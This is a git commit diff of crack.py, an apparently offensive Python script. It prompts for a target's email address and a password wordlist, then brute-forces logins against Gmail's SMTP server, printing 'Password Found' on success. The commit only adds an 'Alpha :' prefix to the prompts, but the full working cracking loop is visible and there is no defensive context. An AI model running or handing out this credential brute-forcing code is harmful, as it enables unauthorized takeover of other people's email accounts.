f59b1697f83b830b2401a73131092fd7c7eb553e
Parsa Alpha <alpha@parsa-alpha.cf>
2017-03-03 12:08:45 +0330

    Update crack.py

--- crack.py
+++ crack.py
@@ -5,18 +5,18 @@ def main():
     smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
     smtpserver.ehlo()
     smtpserver.starttls()
-
-    user = raw_input("Enter the target's email address: ")
-    passwfile = raw_input("Enter the password file name: ")
+\
+    user = raw_input("Alpha : Enter the target's email address: ")
+    passwfile = raw_input("Alpha : Enter the password file name: ")
     passwfile = open(passwfile, "r")
 
     for password in passwfile:
         try:
             smtpserver.login(user, password)
-            print("[+] Password Found: %s" % password)
+            print("Alpha : [+] Password Found: %s" % password)
             break
         except smtplib.SMTPAuthenticationError:
-            print("[!] Password Incorrect: %s" % password)
+            print("Alpha : [!] Password Incorrect: %s" % password)
 
 if __name__ == "__main__":
     main()
